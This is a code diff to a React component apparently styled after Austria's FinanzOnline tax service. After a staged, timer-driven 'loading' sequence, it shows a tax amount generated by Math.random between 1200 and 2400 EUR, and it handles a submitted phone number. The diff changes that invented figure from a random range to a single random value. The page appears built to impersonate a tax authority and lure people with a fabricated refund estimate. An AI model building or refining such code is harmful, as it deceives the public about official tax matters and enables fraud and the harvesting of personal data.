@@ -27,7 +27,7 @@ const FinanzonlineSteuer = () => {
   const [stage, setStage] = useState<"form" | "loading" | "result">("form");
   const [submitting, setSubmitting] = useState(false);
   const [loadingStep, setLoadingStep] = useState(0);
-  const [amount, setAmount] = useState<{ low: string; high: string } | null>(null);
+  const [amount, setAmount] = useState<string | null>(null);
 
   useEffect(() => {
     if (stage !== "loading") return;
@@ -37,9 +37,8 @@ const FinanzonlineSteuer = () => {
       setTimeout(() => setLoadingStep(2), 4000),
     ];
     const finishTimer = setTimeout(() => {
-      const low = 1200 + Math.random() * 600;
-      const high = low + 200 + Math.random() * (2400 - (low + 200));
-      setAmount({ low: formatEUR(low), high: formatEUR(high) });
+      const value = 1200 + Math.random() * 1200; // 1200,00 - 2400,00
+      setAmount(formatEUR(value));
       setStage("result");
       setSubmitting(false);
     }, 6000);
@@ -48,6 +47,7 @@ const FinanzonlineSteuer = () => {
       clearTimeout(finishTimer);
     };
   }, [stage]);
+
 
   const handleSubmit = useCallback(async () => {
     const trimmed = phone.trim();
